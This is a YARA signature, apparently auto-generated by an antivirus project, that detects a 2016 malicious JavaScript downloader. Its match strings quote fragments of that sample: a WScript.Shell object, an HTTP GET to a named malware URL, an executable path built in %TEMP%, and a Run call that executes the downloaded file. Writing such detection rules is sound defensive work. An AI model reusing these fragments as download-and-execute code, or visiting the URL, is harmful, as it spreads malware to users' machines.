rule sig_20160330_1c0598d26fe8059e3220e39d13522e8c {
  meta:
    description = "datamaliciousorder - file 20160330_1c0598d26fe8059e3220e39d13522e8c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ae4841f935a09ab57817ec40f4a0b5cf0a049971f79c48e383246fce08f19f06"

  strings:
    $s1  = "var P = function TB() {return WScript[Y0](\"WScript\"+\".Shell\");}(), Y1 = 11;" fullword ascii
    $s2  = "Q0[EJ](\"GET\", \"http://brand-obuv.ru/m3isud\", false);" fullword ascii
    $s3  = "function Q(N0, NU){PN0 = PN0 * 1; return N0 - NU;};" fullword ascii
    $s4  = "if (Q0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function W() {return P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"5ytnZZ3CMay5v.ex\" + \"e\";};" fullword ascii
    $s6  = "function O(){return NV + \"\";};" fullword ascii
    $s7  = "function GR(WS){P[\"Run\"](WS, PN0, PN0);};" fullword ascii
    $s8  = "function RQ() {return ((N == true) && (N == QB)) ? 1 : PN0;};" fullword ascii
    $s9  = "function Y(){return 22;};" fullword ascii
    $s10 = "var VI = new this[\"Date\"]();" fullword ascii
    $s11 = "function PN()" fullword ascii
    $s12 = "return Q(UY, G);" fullword ascii
    $s13 = "}while (D);" fullword ascii
    $s14 = "function QT(WH) {var Z = (1, 2, 3, 4, 5, WH); return Z;};" fullword ascii
    $s15 = "function U(){return Y0;};" fullword ascii
    $s16 = "N = true; " fullword ascii
    $s17 = "QB = true; " fullword ascii
    $s18 = "var KG = false;" fullword ascii
    $s19 = "var QB = false;" fullword ascii
    $s20 = "} catch(SC){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}